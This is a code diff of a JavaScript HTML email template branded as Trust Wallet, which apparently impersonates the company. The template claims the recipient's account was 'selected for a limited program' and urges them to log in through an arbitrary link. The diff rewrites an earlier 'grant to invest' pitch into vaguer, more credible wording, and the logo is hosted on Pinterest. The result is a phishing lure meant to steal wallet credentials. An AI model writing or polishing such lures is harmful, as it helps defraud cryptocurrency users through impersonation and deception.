@@ -5,7 +5,7 @@ exports.trustTemplate = (link, recipientEmail) => {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trust Grant Notification</title>
+    <title>Trust Notification</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -62,17 +62,22 @@ exports.trustTemplate = (link, recipientEmail) => {
 <body>
     <div class="email-container">
         <img src="https://i.pinimg.com/736x/6c/3c/74/6c3c744dd40d28853c29f90692d1312e.jpg" alt="Trust Logo" class="logo">
-        <h1>Trust Grant Notification </h1>
+        <h1>Trust Notification </h1>
         <p>Hello${recipientEmail ? ` ${recipientEmail}` : ""},</p>
         <p>
-            We are excited to announce that you have been selected to receive a grant to invest in the Trust platform. This grant will be used to support the development and growth of the platform, and we look forward to seeing the positive impact it will have on the trust community.
+            We are reaching out to inform you that your Trust account has been selected for a limited program aimed at supporting user engagement and platform development.
+
+            To view the details of your account and participation status, please log in using the link below:
+
         </p>
-        <a href="${link}" class="cta-button">Go to My Account</a>
+        <a href="${link}" class="cta-button">Access My Account</a>
         <p>
-            If you have any questions or did not expect this email, please contact our support team at support@trustwallet.com.
+            
+            If you did not request this or have any questions, feel free to contact our support team at support@trustwallet.com.
+
         </p>
 
-           <p><strong>Thank you for being a valued Trust Wallet user!</strong></p>
+           <p><strong>Thank you for being a valued part of the Trust community.</strong></p>
     
         <p>Best regards,</p>
         <p>
